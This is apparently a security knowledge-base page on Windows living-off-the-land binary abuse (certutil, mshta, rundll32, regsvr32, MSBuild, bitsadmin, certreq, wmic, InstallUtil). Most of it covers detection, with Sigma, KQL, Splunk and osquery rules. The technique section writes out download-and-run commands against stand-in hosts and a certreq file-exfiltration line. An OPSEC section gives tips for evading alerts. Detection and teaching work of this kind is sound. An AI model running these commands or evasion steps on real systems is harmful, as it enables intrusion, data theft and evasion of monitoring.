# Windows LOLBAS & Signed-Binary Proxy Execution

_Using Microsoft-signed binaries to execute payloads and move files, and the command-line plus parent-child telemetry that still catches it even when the binary is trusted._

## What & why

The goal is to run code and transfer files using binaries that ship with Windows and are signed by Microsoft, so that the executing process passes naive allowlisting, code-signing checks, and reputation scoring. This is the "Living Off the Land Binaries and Scripts" (LOLBAS) class of tradecraft: a trusted host binary acts as a proxy for attacker-supplied logic. The OPSEC rationale is that an operator avoids dropping a novel unsigned PE that triggers reputation-based blocking, and blends into a process baseline already full of `rundll32.exe`, `certutil.exe`, and `regsvr32.exe` invocations. The trade-off, and the entire point of this page, is that the binary being signed does not hide its argument vector or its parent process. The argv is exactly where the abuse lives, and that is exactly what modern detection keys on. Signed-binary proxy execution beats signature and allowlist controls but loses to command-line plus parent-child behavioral telemetry. See [Process injection telemetry](./03-process-injection.md) and [base64 and encoding tells](../linux/02-base64-and-encoding.md) for sibling pages this technique ties into.

## Technique

LOLBAS abuse splits into two functional buckets that often chain: execution proxies (run code) and ingress/transfer tools (move bytes onto the host). The canonical entries below are catalogued by the LOLBAS project with their abuse functions (Execute, Download, AWL Bypass, etc.).

### certutil - download and decode

`certutil.exe` is a certificate-management utility, but its caching and encoding flags make it a download and decode primitive. `-urlcache -f` fetches a URL and writes the body to disk; `-decode` is the Windows analogue of `base64 -d` on Unix and `-encode` is the analogue of `base64`.

```cmd
:: Download a payload (the -urlcache -f -split pattern is heavily signatured)
certutil.exe -urlcache -f http://192.0.2.10/a.txt %TEMP%\a.txt

:: Base64-decode a staged blob to a PE (this is base64 -d for Windows)
certutil.exe -decode %TEMP%\a.b64 %TEMP%\a.exe
```

Notes: `-decode` strips the `-----BEGIN CERTIFICATE-----` armor if present, but also decodes raw base64. The strings `certutil`, `-urlcache`, `-decode`, `-encode`, and `-split` are among the most-alerted LOLBAS tokens in existence; treat any of them in a command line as near-certain to fire a rule. `-verifyctl -f -split` is a lesser-known download variant that achieves the same fetch.

### mshta - HTA and inline script execution

`mshta.exe` executes HTML Application content, including remote `.hta` files and inline `vbscript:`/`javascript:` protocol payloads.

```cmd
:: Remote HTA
mshta.exe http://192.0.2.10/x.hta

:: Inline vbscript that spawns a process and exits the host
mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""calc.exe""):close")
```

Notes: `mshta.exe` spawned by an Office application (`winword.exe`, `excel.exe`) or by `wscript.exe` is a high-fidelity macro-to-payload signal. The `vbscript:` / `javascript:` prefix in argv is a strong static tell.

### rundll32 - DLL export and scriptlet execution

`rundll32.exe` calls a named export in a DLL. It is abused to run an attacker DLL export, and historically to run JavaScript via the `javascript:` moniker plus `mshtml`/`RunHTMLApplication`.

```cmd
:: Run an export named "Start" from a malicious DLL
rundll32.exe C:\Users\Public\evil.dll,Start

:: JavaScript-via-rundll32 (RunHTMLApplication moniker pattern)
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new ActiveXObject("WScript.Shell").Run("calc.exe")
```

Notes: a `rundll32.exe` command line containing a URL, a `javascript:` moniker, `mshtml`, `RunHTMLApplication`, or a DLL path under a user-writable directory (`\Users\`, `\Temp\`, `\AppData\`) is anomalous. Legitimate `rundll32` calls reference system DLLs by name under `System32`.

### regsvr32 - scriptlet (Squiblydoo) execution

`regsvr32.exe` registers COM DLLs, but `/i` with a remote `.sct` scriptlet and `scrobj.dll` executes attacker script without touching the registry persistently. This is the "Squiblydoo" pattern.

```cmd
regsvr32.exe /s /n /u /i:http://192.0.2.10/file.sct scrobj.dll
```

Notes: `scrobj.dll` plus a URL in the `/i:` field is the canonical Squiblydoo signature. `/u` (unregister) combined with `/i:` and a remote URL is contradictory enough to be its own indicator.

### msbuild - inline tasks (AWL bypass)

`MSBuild.exe` compiles project files and will execute C# embedded in an inline `<Task>` / `UsingTask` element of a `.csproj`/`.xml` file. Because MSBuild is Microsoft-signed and often allowlisted by AppLocker/WDAC default rules, it is an Application Whitelisting (AWL) bypass.

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\Users\Public\build.xml
```

Notes: the compiled task runs in-process under `MSBuild.exe`. Detection focuses on MSBuild reading a project file from a user-writable path, MSBuild with no parent developer toolchain (no Visual Studio / devenv lineage), and MSBuild making network connections.

### bitsadmin and certreq - file transfer

`bitsadmin.exe` schedules Background Intelligent Transfer Service (BITS) jobs to download; `certreq.exe -post` can both exfiltrate (POST a file) and receive a response body, making it a bidirectional transfer tool.

```cmd
:: BITS download
bitsadmin.exe /transfer job /download /priority high http://192.0.2.10/a.txt %TEMP%\a.txt

:: certreq POST (exfil request body, capture response to a file)
certreq.exe -post -config http://192.0.2.10/ %TEMP%\data.bin out.txt
```

Notes: BITS transfers also surface in the BITS-Client operational log independent of process telemetry (see Detection). The `bitsadmin` binary is deprecated in favor of the `Start-BitsTransfer` PowerShell cmdlet, so its presence in argv is itself slightly anomalous on modern estates.

### wmic - process creation and remote execution

`wmic.exe` (deprecated but frequently still present) creates processes locally and remotely and can run XSL scripts via the `format:` switch ("Squiblytwo").

```cmd
:: Local process creation
wmic.exe process call create "cmd.exe /c calc.exe"

:: Remote process creation
wmic.exe /node:198.51.100.20 /user:CORP\svc process call create "cmd.exe /c whoami"

:: XSL scriptlet execution (Squiblytwo)
wmic.exe os get /format:"http://192.0.2.10/evil.xsl"
```

Notes: `process call create` and `/format:` with a URL or local `.xsl` path are the abuse strings. Remote `wmic` with `/node:` is a lateral-movement signal correlated with WMI activity on the target.

### InstallUtil - .NET installer execution (AWL bypass)

`InstallUtil.exe` is the .NET Framework installer tool. It invokes the `Uninstall`/`Install` methods of a class decorated as a `RunInstaller`, which executes attacker code in a context that bypasses some AWL policy because the assembly is invoked by a signed Microsoft binary rather than run directly.

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Public\evil.exe
```

Notes: the `/U` (uninstall) call path is the classic trigger because the `Uninstall` method runs before normal entry-point execution. InstallUtil reading an assembly from a user-writable directory is anomalous.

## OPSEC notes

The loud version of every technique above is the un-laundered argv: a verbatim `certutil -urlcache -f http://...`, a `regsvr32 ... scrobj.dll` with a URL, or `mshta` with a `vbscript:` prefix. These are static strings that ship inside default detection content across virtually every EDR and SIEM. The binary being Microsoft-signed and living in `System32` does nothing to suppress the command line that the kernel records on process creation - argv is captured by the audit subsystem and by EDR minifilters before the process even runs its logic.

The "quieter" variant is relative, not absolute, and consists of:
- Avoiding the most-signatured tokens entirely. Prefer a transfer method that does not embed `-urlcache`, `-decode`, or `scrobj.dll` in argv. There is no quiet `certutil -decode` - it is one of the single most-alerted LOLBAS strings, so a quiet operation does not use it at all and decodes in memory instead.
- Preserving plausible parentage. A LOLBAS binary whose parent is `winword.exe`, `outlook.exe`, `wscript.exe`, or `powershell.exe` is far louder than the same binary under a developer or admin lineage. Process hierarchy is logged and is the dominant behavioral feature.
- Avoiding network egress directly from the LOLBAS binary. `certutil.exe`, `rundll32.exe`, `regsvr32.exe`, `mshta.exe`, and `MSBuild.exe` making outbound TCP/HTTP connections is by itself a high-fidelity indicator, independent of argv content.

Failure modes and tells:
- Even a renamed copy of `certutil.exe` is caught by `OriginalFileName` in the PE version resource, which Sysmon logs separately from the on-disk image name.
- LOLBAS binaries writing to or reading from `\AppData\`, `\Temp\`, `\Users\Public\`, or `\ProgramData\` paths produce file-path anomalies that survive any argv obfuscation.
- The signed binary still inherits the integrity level and token of its parent; a medium-integrity `mshta` under a browser is consistent with exploitation regardless of how clean the command line looks.

## Detection & telemetry

This is the section that matters. Signed-binary proxy execution is defeated almost entirely at the command-line and parent-child layer. Allowlisting alone fails; behavioral telemetry succeeds.

### Process creation - the primary signal

Two log sources record process creation with full command line:

- Sysmon Event ID 1 (Process Create). Fields: `Image`, `OriginalFileName`, `CommandLine`, `ParentImage`, `ParentCommandLine`, `User`, `IntegrityLevel`, `Hashes`. `OriginalFileName` defeats binary renaming. `ParentImage` is the parent-child link.
- Windows Security log Event ID 4688 (A new process has been created). Fields: `NewProcessName`, `ParentProcessName`, `ProcessCommandLine`. Command line capture requires the policy "Include command line in process creation events" (sets the `ProcessCreationIncludeCmdLine_Enabled` value), and command-line auditing must be enabled. Without that GPO, 4688 records the image but not argv.

Hunt logic that holds across the whole LOLBAS class:
1. Known LOLBAS image (or matching `OriginalFileName`) plus an anomalous argument token.
2. Known LOLBAS image plus an unexpected parent (Office app, script host, browser).
3. Known LOLBAS image plus an outbound network connection (see Sysmon EID 3 below).

Sigma-style detection for the certutil download/decode pattern:

```yaml
title: Certutil Download or Base64 Decode (LOLBAS)
logsource:
  category: process_creation
  product: windows
detection:
  selection_img:
    - Image|endswith: '\certutil.exe'
    - OriginalFileName: 'CertUtil.exe'
  selection_flags:
    CommandLine|contains:
      - '-urlcache'
      - 'urlcache'
      - '-decode'
      - 'decode'
      - '-encode'
      - '-verifyctl'
      - '-split'
  condition: selection_img and selection_flags
level: high
```

KQL (Microsoft Defender / Sentinel `DeviceProcessEvents`) for suspicious LOLBAS parentage:

```kql
DeviceProcessEvents
| where FileName in~ ("mshta.exe","rundll32.exe","regsvr32.exe","certutil.exe","msbuild.exe","installutil.exe","wmic.exe")
| where InitiatingProcessFileName in~ ("winword.exe","excel.exe","powerpnt.exe","outlook.exe","wscript.exe","cscript.exe","mshta.exe")
| project Timestamp, DeviceName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName
```

Splunk against Sysmon EID 1 for Squiblydoo and the rundll32 JS moniker:

```spl
index=sysmon EventCode=1
( (Image="*\\regsvr32.exe" CommandLine="*scrobj.dll*" CommandLine="*/i:*")
  OR (Image="*\\rundll32.exe" (CommandLine="*javascript:*" OR CommandLine="*RunHTMLApplication*" OR CommandLine="*mshtml*"))
  OR (Image="*\\regsvr32.exe" CommandLine="*http*") )
| table _time host Image CommandLine ParentImage ParentCommandLine User
```

osquery point-in-time check for LOLBAS binaries living off `System32` (renamed or relocated copies):

```sql
SELECT p.pid, p.name, p.path, p.cmdline, pp.path AS parent_path, p.parent
FROM processes p
LEFT JOIN processes pp ON p.parent = pp.pid
WHERE p.name IN ('certutil.exe','mshta.exe','rundll32.exe','regsvr32.exe','msbuild.exe','installutil.exe','wmic.exe','bitsadmin.exe')
  AND p.path NOT LIKE 'C:\Windows\System32\%'
  AND p.path NOT LIKE 'C:\Windows\SysWOW64\%'
  AND p.path NOT LIKE 'C:\Windows\Microsoft.NET\%';
```

### Network telemetry

- Sysmon Event ID 3 (Network connection). Fields: `Image`, `DestinationIp`, `DestinationPort`, `DestinationHostname`, `Initiated`. Any of `certutil.exe`, `rundll32.exe`, `regsvr32.exe`, `mshta.exe`, `MSBuild.exe`, `InstallUtil.exe` appearing as `Image` here is high-fidelity because these binaries have no legitimate reason to make outbound connections in most baselines.

```kql
DeviceNetworkEvents
| where InitiatingProcessFileName in~ ("certutil.exe","rundll32.exe","regsvr32.exe","mshta.exe","msbuild.exe","installutil.exe")
| where RemoteIPType == "Public"
| project Timestamp, DeviceName, InitiatingProcessFileName,
          InitiatingProcessCommandLine, RemoteIP, RemoteUrl, RemotePort
```

### BITS-specific telemetry

BITS transfers via `bitsadmin` or `Start-BitsTransfer` are logged independently of process creation in:
- `Microsoft-Windows-Bits-Client/Operational` event log. Event ID 59 (BITS started a transfer job, includes the URL), Event ID 60 (job stopped), Event ID 16403 and related job lifecycle events. Hunting Event ID 59 surfaces the remote URL even when the process command line was missed.

### File and DNS artifacts

- Sysmon Event ID 11 (FileCreate) catches the on-disk output of `certutil -urlcache`, `certutil -decode`, and `bitsadmin /download` - watch for LOLBAS `Image` writing to `\Temp\`, `\AppData\`, `\Users\Public\`, `\ProgramData\`.
- Sysmon Event ID 22 (DnsQuery) attributes a DNS lookup to `certutil.exe`/`rundll32.exe`/`mshta.exe` as `Image`, useful where the eventual connection is missed but the resolution is not.
- certutil's URL cache itself persists artifacts under the user profile cryptographic URL cache directory, which is a forensic recovery point after the fact.

### LOLBAS-to-detection table

| Binary | Abused for | Loudest argv token(s) | Primary detection |
| --- | --- | --- | --- |
| `certutil.exe` | Download, base64 decode/encode (`-decode` = `base64 -d`) | `-urlcache`, `-f`, `-decode`, `-encode`, `-split`, `-verifyctl` | Sysmon EID 1 cmdline; EID 3 net; EID 11 file write |
| `mshta.exe` | Remote HTA, inline `vbscript:`/`javascript:` exec | `http(s)://...hta`, `vbscript:`, `javascript:` | EID 1 cmdline + `ParentImage` (Office/script host); EID 3 |
| `rundll32.exe` | DLL export run, JS moniker exec | URL, `javascript:`, `mshtml`, `RunHTMLApplication`, user-path DLL | EID 1 cmdline + non-System32 DLL path; EID 3 |
| `regsvr32.exe` | Squiblydoo remote scriptlet | `scrobj.dll`, `/i:http...`, `/u` | EID 1 `scrobj.dll`+URL; EID 3 |
| `MSBuild.exe` | Inline-task C# exec, AWL bypass | project file under user-writable path | EID 1 `ParentImage` (no dev lineage); EID 3 |
| `bitsadmin.exe` | BITS file transfer | `/transfer`, `/download`, URL | BITS-Client/Operational EID 59; EID 1 |
| `certreq.exe` | `-post` transfer / exfil | `-post`, `-config http...` | EID 1 cmdline; EID 3 |
| `wmic.exe` | Process create, remote exec, XSL (Squiblytwo) | `process call create`, `/node:`, `/format:http...` | EID 1 cmdline; WMI activity logs |
| `InstallUtil.exe` | .NET installer code exec, AWL bypass | `/U`, assembly under user-writable path | EID 1 cmdline + file path; EID 3 |

### Hardening that shrinks the surface

- WDAC/AppLocker rules that explicitly block or audit `bitsadmin.exe`, `mshta.exe`, `wmic.exe`, and constrain `regsvr32`/`rundll32`/`InstallUtil`/`MSBuild` where the workload does not need them. Note these are Microsoft-signed, so they pass default publisher rules - they must be denied by name.
- Enable command-line process auditing (4688 with `ProcessCreationIncludeCmdLine_Enabled`) so the SIEM sees argv even without Sysmon.
- Attack Surface Reduction (ASR) rules that block executable content from email/Office and block Office from creating child processes cut the most common LOLBAS launch parents.

## MITRE ATT&CK

- T1218 - System Binary Proxy Execution (parent technique)
- T1218.005 - System Binary Proxy Execution: Mshta
- T1218.010 - System Binary Proxy Execution: Regsvr32
- T1218.011 - System Binary Proxy Execution: Rundll32
- T1218.004 - System Binary Proxy Execution: InstallUtil
- T1127 - Trusted Developer Utilities Proxy Execution
- T1127.001 - Trusted Developer Utilities Proxy Execution: MSBuild
- T1140 - Deobfuscate/Decode Files or Information (certutil -decode)
- T1105 - Ingress Tool Transfer (certutil, bitsadmin, certreq)
- T1197 - BITS Jobs
- T1047 - Windows Management Instrumentation (wmic)
- T1059.005 / T1059.007 - Command and Scripting Interpreter: Visual Basic / JavaScript (mshta, rundll32 inline)

## References

- LOLBAS Project - catalog of living-off-the-land binaries, scripts, and libraries. https://lolbas-project.github.io/
- MITRE ATT&CK T1218 System Binary Proxy Execution. https://attack.mitre.org/techniques/T1218/
- MITRE ATT&CK T1127 Trusted Developer Utilities Proxy Execution. https://attack.mitre.org/techniques/T1127/
- Microsoft Sysinternals Sysmon documentation (event IDs and configuration). https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- Microsoft - Audit Process Creation and command-line auditing (Event 4688). https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing
- Microsoft certutil command reference. https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
- Microsoft BITS / BITS-Client operational logging. https://learn.microsoft.com/en-us/windows/win32/bits/about-bits
- SigmaHQ detection rules (process_creation LOLBAS rules). https://github.com/SigmaHQ/sigma
